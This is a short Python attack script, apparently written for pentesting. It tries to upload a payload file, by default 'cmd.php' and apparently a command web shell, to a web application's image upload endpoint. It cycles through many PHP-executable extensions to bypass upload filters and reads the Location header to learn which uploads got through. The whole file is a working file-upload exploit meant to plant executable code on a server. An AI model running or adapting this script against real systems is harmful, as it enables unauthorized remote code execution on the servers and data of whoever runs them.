import signal
import sys
import requests
from termcolor import colored
import argparse
import time

# Signal handler for graceful exit on Ctrl+C
def def_handler(sig, frame):
    print(colored("\n\n[!] Exiting...\n", 'red'))
    sys.exit(1)

# Set up Ctrl+C handler
signal.signal(signal.SIGINT, def_handler)

# Default configuration
default_extensions = [
    ".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7",
    ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess",
    ".phar", ".inc", ".hphp", ".ctp", ".module"
]

def file_upload(upload_url, cookies, burp_proxy, file_path, extensions):
    try:
        # Open and read the payload file
        with open(file_path, "r") as f:
            file_content = f.read().strip()

        # Try uploading the file with each extension
        for extension in extensions:
            file_to_upload = {'image': ('cmd' + extension, file_content)}

            try:
                r = requests.post(upload_url, cookies=cookies, files=file_to_upload, allow_redirects=False, proxies=burp_proxy)
                location_header = r.headers.get("Location", "")
    
                if f"{failedhead}" not in location_header and f"{successhead}" in location_header:
                    print(colored(f"[+] File cmd{extension} uploaded successfully", 'green'))
                else:
                    print(colored(f"[-] Failed to upload cmd{extension} - Status code: {r.status_code}", 'yellow'))
                time.sleep(1)
            except requests.RequestException as e:
                print(colored(f"[!] Error during request: {str(e)}", 'red'))

    except FileNotFoundError:
        print(colored(f"[!] The file {file_path} was not found", 'red'))
    except Exception as e:
        print(colored(f"[!] An error occurred: {str(e)}", 'red'))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='File upload script for pentesting.')
    parser.add_argument('upload_url', help='The URL to upload the file to')
    parser.add_argument('session_cookie', help='The PHP session cookie value')
    parser.add_argument('--burp', default='http://127.0.0.1:8080', help='Burp Suite proxy (default: http://127.0.0.1:8080)')
    parser.add_argument('--file', default='cmd.php', help='The file to upload (default: cmd.php)')
    parser.add_argument('--extensions', nargs='*', default=default_extensions, help='List of file extensions to try (default: common PHP extensions)')
    parser.add_argument('--fail', default='failed', help='Keyword to check for failure in the Location header')
    parser.add_argument('--success', default='succes', help='Keyword to check for success in the Location header')

    args = parser.parse_args()

    cookies = {'PHPSESSID': args.session_cookie}
    burp_proxy = {'http': args.burp}
    failedhead = args.fail
    successhead = args.success

    file_upload(args.upload_url, cookies, burp_proxy, args.file, args.extensions)
